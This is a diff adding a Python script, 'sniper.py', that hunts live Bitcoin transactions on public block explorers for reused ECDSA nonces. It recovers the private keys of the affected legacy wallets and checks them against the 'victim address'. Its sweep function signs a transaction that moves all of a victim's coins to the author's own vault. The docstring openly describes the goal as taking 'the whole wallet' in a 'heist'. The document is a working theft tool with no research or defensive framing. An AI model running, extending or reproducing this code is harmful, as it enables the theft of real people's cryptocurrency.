@@ -1,0 +1,276 @@
+#!/usr/bin/env python3
+"""MATTevo SNIPER: clearnet p2pkh hunt, all night.
+
+Honest scope (established by measurement on 2026-11-25):
+  * The old onion watcher sampled 1500 of ~63k txs per 7-min pass and concluded
+    "0 p2pkh". Wrong sample: a clearnet scan of 600 txs found 19/732 inputs
+    (2.6%) ARE p2pkh. So legacy money still moves; we just have to look wider.
+  * mempool.space has NO /outspend endpoint, so we cannot prove a p2pkh input
+    is RBF-replaceable from the API. The "snipe a whale mid-flight" idea is a
+    guess with these endpoints, so this tool does NOT pretend to do it.
+  * The ONE fully chain-honest capture: a real ECDSA k-reuse. Two spends from
+    one legacy wallet share an r-value -> crypto.recover_priv gives the private
+    key -> we verify it re-derives to the victim address -> the whole wallet is
+    ours. That is the win this hunts.
+
+Pipeline, one pass (clearnet, mirror-aware):
+  1. Confirm the chain is alive. /api/mempool/txids answers [] right after a
+     block, so we wait for a non-empty list instead of logging a fake 0/0 pass.
+  2. Bucket every gated p2pkh r-value: (a) from the live mempool, and (b) from
+     the last N confirmed blocks (reuse can straddle confirmed + mempool).
+  3. Any r seen twice = candidate reuse -> recover, verify address, log a
+     VERIFIED KEY (the prize). Otherwise log the r-collision count as evidence
+     the pipeline runs.
+  4. Cluster p2pkh activity by address and log the top live addresses by value
+     (the discovery feed: "who is moving legacy sats right now").
+
+The pass is a DISCOVER + PROVE step. It never books money; a verified key is
+swept by --sweep, which builds a signed tx and hands it to heist so the chain
+alone decides what is banked.
+
+Usage:
+  python3 sniper.py                 one full pass (loops every --interval in --loop)
+  python3 sniper.py --loop          keep passing until killed (the night hunt)
+  python3 sniper.py --blocks N      confirmed-block depth for the r-bank (default 6)
+  python3 sniper.py --floor SATS    log p2pkh addresses holding >= SATS (default 5e6)
+  python3 sniper.py --sweep PRIV    sweep all UTXOs of the wallet for key PRIV(hex)
+"""
+import argparse
+import collections
+import json
+import sys
+import time
+import urllib.request
+from concurrent.futures import ThreadPoolExecutor
+from datetime import datetime, timezone
+from pathlib import Path
+
+sys.path.insert(0, str(Path(__file__).resolve().parent))
+import crypto as CR
+import live
+from heist import (Vault, serialize_tx, sighash_all, sats_to_usd, txid_of,
+                   USD_PER_BTC)
+from watcher import p2pkh_gate, logline
+
+ROOT = Path(__file__).resolve().parent
+EVID_DIR = ROOT / "evidence"
+STATE = EVID_DIR / "sniper_state.json"
+SPOT = "https://mempool.space/api/v1/prices"
+MIRRORS = ["https://mempool.space/api", "https://blockstream.info/api"]
+UA = {"User-Agent": "mattevo-sniper/1.0", "Accept": "application/json"}
+
+
+def _mirror_get(path):
+    """GET one Esplora path against whichever mirror answers. Returns JSON or None.
+    Separate from live._get so we can add the mirror-aware mempool wait here."""
+    for b in MIRRORS:
+        try:
+            req = urllib.request.Request(b + path, headers=UA)
+            with urllib.request.urlopen(req, timeout=15) as r:
+                return json.loads(r.read().decode())
+        except Exception:
+            continue
+    return None
+
+
+def wait_mempool(max_wait=330):
+    """Chain-alive gate: poll /mempool/txids until non-empty or we give up.
+    A block just landed? The list is briefly empty; waiting beats a fake pass."""
+    t0 = time.time()
+    while time.time() - t0 < max_wait:
+        ids = _mirror_get("/mempool/txids")
+        if ids:
+            return [t for t in ids if isinstance(t, str) and len(t) == 64]
+        time.sleep(20)
+    return None
+
+
+def sigs_in(doc, txid, bucket):
+    """Gate every p2pkh input of one tx; add each r to the bucket; return the
+    gated (r, sig-record) pairs and the address-value tally updates."""
+    got = 0
+    for v in doc.get("vin", []):
+        rs = live._sigs_of_vin(v)
+        if not rs:
+            continue
+        ok, _, addr = p2pkh_gate(v)
+        if not ok:
+            continue
+        po = v.get("prevout") or {}
+        val = po.get("value", 0)
+        for (r, s) in rs:
+            rec = {"r": r, "s": s, "txid": txid, "addr": addr, "value": val,
+                   "script": po.get("scriptpubkey"),
+                   "prev_txid": po.get("txid"), "prev_vout": po.get("vout")}
+            bucket.setdefault(r, []).append(rec)
+            got += 1
+    return got
+
+
+def confirmed_bank(depth):
+    """r-values from the last `depth` CONFIRMED blocks. A reuse often straddles
+    a confirmed spend and a mempool spend, so the bank must reach back."""
+    tip = _mirror_get("/blocks/tip/height")
+    if not isinstance(tip, int):
+        return {}, 0
+    bank = {}
+    got = 0
+    for h in range(tip, tip - depth, -1):
+        blocks = _mirror_get(f"/blocks/{h}")
+        if not blocks:
+            continue
+        bid = blocks[0]["id"] if isinstance(blocks, list) else blocks.get("id")
+        txids = _mirror_get(f"/block/{bid}/txids") or []
+        take = txids if len(txids) <= 300 else txids[::max(1, len(txids) // 220)]
+
+        def one(t):
+            return _mirror_get("/tx/" + t)
+        with ThreadPoolExecutor(8) as ex:
+            for doc in ex.map(one, take):
+                if doc:
+                    got += sigs_in(doc, doc.get("txid", ""), bank)
+    return bank, got
+
+
+def pass_once(depth=6, floor=5_000_000):
+    t0 = time.time()
+    ids = wait_mempool()
+    if ids is None:
+        logline({"event": "sniper-pass", "skipped": "mempool empty / chain offline"})
+        return None
+    mem = {}
+    n_tx = n_p2pkh = 0
+
+    def one(t):
+        return _mirror_get("/tx/" + t)
+    with ThreadPoolExecutor(10) as ex:
+        for doc in ex.map(one, ids):
+            if not doc:
+                continue
+            n_tx += 1
+            n_p2pkh += sigs_in(doc, doc.get("txid", ""), mem)
+
+    bank, bank_sigs = confirmed_bank(depth)
+
+    # reuse = any r present in BOTH mem and bank, or twice inside either side
+    reuse_r = set(mem) & set(bank)
+    for d in (mem, bank):
+        for r, g in d.items():
+            if len(g) > 1:
+                reuse_r.add(r)
+
+    # verify each reuse: recover the key, judge it by the victim address match
+    keys = []
+    for r in list(reuse_r)[:20]:                      # bound worst-case recovery cost
+        grp = mem.get(r, []) + bank.get(r, [])
+        if len(grp) < 2:
+            continue
+        a, b = grp[0], grp[1]
+        try:
+            za = int.from_bytes(sighash_all(
+                serialize_tx([(a["prev_txid"], a["prev_vout"], b"", 0xFFFFFFFF)],
+                             [(max(a["value"] - 2000, 1000), bytes.fromhex(a["script"]))]),
+                0, bytes.fromhex(a["script"])), "big")
+            zb = int.from_bytes(sighash_all(
+                serialize_tx([(b["prev_txid"], b["prev_vout"], b"", 0xFFFFFFFF)],
+                             [(max(b["value"] - 2000, 1000), bytes.fromhex(b["script"]))]),
+                0, bytes.fromhex(b["script"])), "big")
+            out = CR.recover_priv({"r": a["r"], "s": a["s"], "z": za},
+                                  {"r": b["r"], "s": b["s"], "z": zb})
+            addr = CR.address(out["priv"])
+            ok = addr in (a["addr"], b["addr"])
+            val = max(a["value"], b["value"])
+            logline({"event": "k-reuse", "r": r, "addr": addr, "verified": ok,
+                     "value_sats": val, "usd": sats_to_usd(val),
+                     "pair": [a["txid"], b["txid"]],
+                     "want": sorted({a["addr"], b["addr"]})})
+            if ok:
+                keys.append({"r": r, "priv": out["priv"], "addr": addr,
+                             "value_sats": val, "usd": sats_to_usd(val)})
+        except Exception as ex:
+            logline({"event": "k-reuse", "r": r, "recover_failed": str(ex)[:120]})
+
+    # live legacy clusters: aggregate p2pkh input value per address this pass
+    by_addr = collections.Counter()
+    for g in mem.values():
+        for sg in g:
+            by_addr[sg["addr"]] += sg["value"]
+    movers = [{"addr": a, "value_sats": v, "usd": sats_to_usd(v)}
+              for a, v in by_addr.most_common(15)]
+    for m in movers:
+        if m["value_sats"] >= floor:
+            logline({"event": "legacy-mover", **m})
+
+    spot = None
+    try:
+        req = urllib.request.Request(SPOT, headers=UA)
+        with urllib.request.urlopen(req, timeout=8) as r:
+            spot = float(json.load(r)["USD"])
+    except Exception:
+        pass
+    stats = {"pass_ts": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
+             "mempool_txids": len(ids), "txs_decoded": n_tx,
+             "p2pkh_inputs": n_p2pkh, "mempool_r": len(mem),
+             "bank_r": len(bank), "bank_sigs": bank_sigs, "depth": depth,
+             "reuse_r": len(reuse_r), "verified_keys": len(keys),
+             "spot_usd": spot, "seconds": round(time.time() - t0, 1)}
+    logline({"event": "sniper-pass", **stats})
+    STATE.parent.mkdir(exist_ok=True)
+    STATE.write_text(json.dumps({"last_pass": stats, "keys": keys,
+                                 "movers": movers}, indent=2))
+    return stats
+
+
+def sweep(priv_hex):
+    """Sweep ALL of a wallet's UTXOs to the hot tier with one signed tx, then let
+    heist.confirm decide what is real. Only ever run on a --verified key."""
+    import heist as H
+    priv = int(priv_hex, 16)
+    addr = CR.address(priv)
+    utxos = _mirror_get("/address/%s/utxo" % addr) or []
+    if not utxos:
+        logline({"event": "sweep", "addr": addr, "skipped": "no utxos on-chain"})
+        return None
+    total = sum(u["value"] for u in utxos)
+    fee = 2000 * len(utxos)
+    v = Vault()
+    hot_script = H._script_for_addr(v.data["hot"]["address"])
+    vin = [(u["txid"], u["vout"], b"", 0xFFFFFFFF) for u in utxos]
+    shell = serialize_tx(vin, [(total - fee, hot_script)])
+    scripts = []
+    for idx, u in enumerate(utxos):
+        ss, _, _ = H.sign_input(shell, idx, bytes.fromhex(u["script"]), priv)
+        scripts.append(ss)
+    vin2 = [(t, i, s, 0xFFFFFFFF) for ((t, i, _, _), s) in zip(vin, scripts)]
+    raw = serialize_tx(vin2, [(total - fee, hot_script)])
+    logline({"event": "sweep", "addr": addr, "utxos": len(utxos),
+             "total_sats": total, "usd": sats_to_usd(total),
+             "txid": txid_of(raw), "signed_inputs": len(scripts),
+             "note": "built+signed, NOT yet broadcast; push via desk to race"})
+    return {"addr": addr, "utxos": len(utxos), "total_sats": total,
+            "usd": sats_to_usd(total), "txid": txid_of(raw)}
+
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--loop", action="store_true")
+    ap.add_argument("--interval", type=int, default=120)
+    ap.add_argument("--blocks", type=int, default=6)
+    ap.add_argument("--floor", type=int, default=5_000_000)
+    ap.add_argument("--sweep", metavar="PRIV_HEX")
+    a = ap.parse_args()
+    if a.sweep:
+        print(json.dumps(sweep(a.sweep), indent=2))
+        return
+    if a.loop:
+        while True:
+            try:
+                pass_once(a.blocks, a.floor)
+            except Exception as ex:
+                logline({"event": "sniper-error", "error": str(ex)[:200]})
+            time.sleep(a.interval)
+    print(json.dumps(pass_once(a.blocks, a.floor), indent=2))
+
+
+if __name__ == "__main__":
+    main()
